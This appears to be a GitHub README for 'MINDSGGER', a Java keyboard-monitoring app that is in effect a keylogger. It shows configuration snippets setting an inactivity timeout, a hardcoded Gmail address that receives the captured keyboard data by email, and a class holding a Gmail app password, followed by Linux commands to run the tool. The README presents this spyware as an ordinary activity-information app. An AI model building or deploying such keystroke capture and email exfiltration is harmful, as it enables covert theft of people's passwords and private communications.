# MINDSGGER

This is an app that provides information about the activities of a device (specifically the keyboard).

Pre-requisite:
- Create an App Gmail password

> [!NOTE]
> Set up the **INACTIVITY_TIMEOUT** value to your preference: [/src/main/java/my/model/Person.java](https://github.com/PineberryCode/MINDSGGER/tree/dev/src/main/java/my/model/Person.java)
```JAVA
/*...*/
// Variable to store the time in milliseconds.
protected long INACTIVITY_TIMEOUT = 1 * 3600 * 1000; // One hour
/*...*/
```

> [!IMPORTANT]
> Set up the input email (app gmail): [/src/main/java/my/controller/GmailFunctions.java](https://github.com/PineberryCode/MINDSGGER/tree/dev/src/main/java/my/controller/GmailFunctions.java)
```JAVA
/*...*/
public class GmailFunctions extends TXT {
    
    Gmail gmail;

    public GmailFunctions () {
        gmail = new Gmail();
    }

    private void bodyEmail () throws AddressException, MessagingException {
        gmail.setEmailTo("mindlunnyfalse@gmail.com"); // Set up => mindlunnyfalse@gmail.com
    /*...*/
```

> [!IMPORTANT]
> Remember to add a file that contains your App Gmail password in this route: [/src/main/java/my/key](https://github.com/PineberryCode/MINDSGGER/tree/dev/src/main/java/my/key)
```JAVA
package my.key;

public class Param {
    protected String passwordGMAILApp = "[Your App Gmail password]";
}
```

## Steps just for Linux users:

###### 1. Enable execute permission
```SHELL
chmod +x run.bash
```
###### 2. Reload (Optional)
```SHELL
source ./run.bash
```
###### 3. Run
```SHELL
./run.bash
```

